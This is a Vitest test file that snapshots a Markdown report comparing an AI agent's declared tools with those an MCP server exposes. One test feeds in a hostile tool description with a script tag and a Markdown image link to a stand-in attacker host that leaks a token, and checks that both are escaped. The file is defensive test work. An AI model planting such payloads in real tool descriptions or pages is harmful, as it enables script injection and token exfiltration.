import { describe, it, expect } from 'vitest';

import { renderVerificationSection } from '../../src/report/templates.js';
import type { VerificationReport } from '../../src/verification/types.js';

/**
 * Golden snapshots for the Markdown "Verification" section. Three fixed
 * inputs cover the three verdicts (verified / discrepancy / unverified) plus
 * an output-escaping scenario. Future render changes will diff visibly.
 *
 * Snapshots intentionally live inline via Vitest's `toMatchInlineSnapshot` so
 * every reviewer sees the rendered Markdown in the diff rather than chasing
 * a side file. Mappings are version-stable; we round capturedAt to fixed
 * ISO strings.
 */

describe('renderVerificationSection — golden output', () => {
  it('verified — no diffs, single source', () => {
    const report: VerificationReport = {
      capturedAt: '2026-05-13T10:00:00.000Z',
      agentLabel: 'hr-agent-pilot',
      declared: [{
        source: 'interview',
        capturedAt: '2026-05-13T09:00:00.000Z',
        tools: [{ name: 'lookup_candidate' }],
      }],
      sources: [{
        sourceId: 'mcp-tools',
        verdict: 'verified',
        diffs: [],
        inventory: {
          source: 'mcp-tools',
          capturedAt: '2026-05-13T10:00:00.000Z',
          tools: [{ name: 'lookup_candidate' }],
        },
      }],
    };

    expect(renderVerificationSection(report)).toMatchInlineSnapshot(`
      "## Verification

      | Source | Verdict | Findings |
      | --- | --- | --- |
      | mcp-tools | Verified | 0 |

      ### Findings

      _No discrepancies found._

      ### Sources

      - mcp-tools — read succeeded at 2026-05-13T10:00:00.000Z (1 tool)"
    `);
  });

  it('discrepancy — 1 extra + 1 missing rendered in severity order', () => {
    const report: VerificationReport = {
      capturedAt: '2026-05-13T10:00:00.000Z',
      agentLabel: 'hr-agent-pilot',
      declared: [{
        source: 'interview',
        capturedAt: '2026-05-13T09:00:00.000Z',
        tools: [
          { name: 'lookup_candidate' },
          { name: 'schedule_meeting' },
        ],
      }],
      sources: [{
        sourceId: 'mcp-tools',
        verdict: 'discrepancy',
        diffs: [
          {
            kind: 'missing',
            dimension: 'tool',
            source: 'mcp-tools',
            declared: { name: 'schedule_meeting' },
            severity: 'medium',
          },
          {
            kind: 'extra',
            dimension: 'tool',
            source: 'mcp-tools',
            actual: {
              name: 'fake_delete',
              description: 'Pretend to delete something.',
            },
            severity: 'high',
          },
        ],
        inventory: {
          source: 'mcp-tools',
          capturedAt: '2026-05-13T10:00:00.000Z',
          tools: [
            { name: 'lookup_candidate' },
            { name: 'fake_delete', description: 'Pretend to delete something.' },
          ],
        },
      }],
    };

    expect(renderVerificationSection(report)).toMatchInlineSnapshot(`
      "## Verification

      | Source | Verdict | Findings |
      | --- | --- | --- |
      | mcp-tools | Discrepancy | 2 |

      ### Findings

      - **[HIGH] Extra tool \`fake_delete\`** (mcp-tools)
        - Description: Pretend to delete something.
      - **[MEDIUM] Missing tool \`schedule_meeting\`** (mcp-tools, declared but not exposed by the source)

      ### Sources

      - mcp-tools — read succeeded at 2026-05-13T10:00:00.000Z (2 tools)"
    `);
  });

  it('unverified — source read failed, error surfaced', () => {
    const report: VerificationReport = {
      capturedAt: '2026-05-13T10:00:00.000Z',
      agentLabel: 'broken-agent',
      declared: [{
        source: 'interview',
        capturedAt: '2026-05-13T09:00:00.000Z',
        tools: [{ name: 'echo' }],
      }],
      sources: [{
        sourceId: 'mcp-tools',
        verdict: 'unverified',
        diffs: [],
        error: {
          kind: 'unauthorized',
          message: '401 Unauthorized from MCP server',
        },
      }],
    };

    expect(renderVerificationSection(report)).toMatchInlineSnapshot(`
      "## Verification

      | Source | Verdict | Findings |
      | --- | --- | --- |
      | mcp-tools | Unverified | — |

      ### Findings

      _No discrepancies found._

      ### Sources

      - mcp-tools — **read failed** (unauthorized): 401 Unauthorized from MCP server"
    `);
  });

  it('output escaping — untrusted MCP-server description does not break Markdown', () => {
    // Reviewer concern (PR #14 F-6): MCP servers can return descriptions like
    // "<script>alert(1)</script>" or "![](http://attacker/?leak=...)". We
    // render them as code blocks / escaped text so they cannot inject layout
    // or hot-link external assets.
    const report: VerificationReport = {
      capturedAt: '2026-05-13T10:00:00.000Z',
      agentLabel: 'hostile-server',
      declared: [],
      sources: [{
        sourceId: 'mcp-tools',
        verdict: 'discrepancy',
        diffs: [{
          kind: 'extra',
          dimension: 'tool',
          source: 'mcp-tools',
          actual: {
            name: 'evil_tool',
            description: '<script>alert(1)</script> ![pwn](http://attacker.example/leak?token=secret)',
          },
          severity: 'high',
        }],
        inventory: {
          source: 'mcp-tools',
          capturedAt: '2026-05-13T10:00:00.000Z',
          tools: [{ name: 'evil_tool' }],
        },
      }],
    };

    const out = renderVerificationSection(report);
    expect(out).not.toContain('<script>');
    expect(out).not.toContain('![pwn]');
    // The literal description text must still be visible to the reviewer,
    // just escaped — they need to *see* what the server tried to inject.
    expect(out).toContain('script');
    expect(out).toContain('alert');
  });
});
